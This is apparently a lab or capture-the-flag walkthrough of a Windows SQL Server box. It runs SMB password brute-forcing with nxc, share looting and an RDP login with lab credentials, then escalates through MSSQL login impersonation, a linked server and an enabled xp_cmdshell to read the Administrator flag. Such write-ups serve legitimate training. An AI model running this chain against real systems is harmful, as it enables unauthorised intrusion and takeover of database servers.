----

Nmap scan to enumerate all the services.
```
PORT     STATE SERVICE       VERSION                                              
135/tcp  open  msrpc         Microsoft Windows RPC                                
445/tcp  open  microsoft-ds?                                                      
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM         
| ms-sql-ntlm-info:                                                               
|   10.129.203.10:1433:                                                           
|     Target_Name: WIN-HARD                   
|     NetBIOS_Domain_Name: WIN-HARD        
|     NetBIOS_Computer_Name: WIN-HARD      
|     DNS_Domain_Name: WIN-HARD           
|     DNS_Computer_Name: WIN-HARD         
|_    Product_Version: 10.0.17763                                                              
| ms-sql-info:
|   10.129.203.10:1433:
|     Version:         
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00          
|       Product: Microsoft SQL Server 2019 
|       Service pack level: RTM            
|       Post-SP patches applied: false  
|_    TCP port: 1433                   
|_ssl-date: 2025-01-12T22:12:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-12T22:10:37
|_Not valid after:  2055-01-12T22:10:37
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2025-01-11T22:10:27
|_Not valid after:  2025-07-13T22:10:27
|_ssl-date: 2025-01-12T22:12:56+00:00; 0s from scanner time.
| rdp-ntlm-info:                                            
|   Target_Name: WIN-HARD                                   
|   NetBIOS_Domain_Name: WIN-HARD                   
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD               
|   Product_Version: 10.0.17763                                    
|_  System_Time: 2025-01-12T22:12:16+00:00                         
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
```

I know there is a user called `simon`, so I tried bruteforcing the smb service.

```bash
nxc smb 10.129.203.10 -u simon -p pass.list
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\simon:liverpool (Guest)
```
With these credentials I downloaded all the readable folders on the share.

```bash
nxc smb 10.129.203.10 -u simon -p liverpool -M spider_plus -o DOWNLOAD_FLAG=True
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus                                      
SMB         10.129.203.10   445    WIN-HARD         [*] Enumerated shares
SMB         10.129.203.10   445    WIN-HARD         Share           Permissions     Remark               
SMB         10.129.203.10   445    WIN-HARD         -----           -----------     ------
SMB         10.129.203.10   445    WIN-HARD         ADMIN$                          Remote Admin                                      
SMB         10.129.203.10   445    WIN-HARD         C$                              Default share                                
SMB         10.129.203.10   445    WIN-HARD         Home            READ        
SMB         10.129.203.10   445    WIN-HARD         IPC$            READ            Remote IPC  
```

The `Home` directory contained credentails for Fiona and the following information
```
To do:                                              
- Keep testing with the database.                   
- Create a local linked server.                     
- Simulate Impersonation.
```
With Fiona's credentails I could rdp to her desktop

```bash
xfreerdp \u:fiona \p:48Ns72!bns74@S84NNNSl \v:10.129.203.10
```

In a `powershell` window I opened `sqlcmd`.

Since the notes from the share said something about impersonating and a local linked server, I looked for these things. 

I look who I could impersonate with Fiona.
```powershell
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

I could impersonate `john` and `simon`

I decided to go for `john` first.

```powershell
1> EXECUTE AS LOGIN = 'john'
2> GO
```

Next I identified linked servers
```powershell
1> SELECT srvname, isremote FROM sysservers
2> GO
```

I saw there was a `LOCAL.TEST.LINKED.SRV`
I verified the user that was on that system with the following command.

```powershell
1> EXECUTE('SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]                                             
2> GO                                                                              
-------------------
testadmin       
```

I was the `testadmin` on the linked server, so I could probably execute commands with `xp_cmdshell`. But before I could use `xp_cmdshell` I had to enable it.

```powershell
1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> GO                                                                              

Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                                    
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. 
```

Now I can execute commands, so I just got the flag. 

```powershell
1> EXECUTE('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]                                          
2> GO   
```

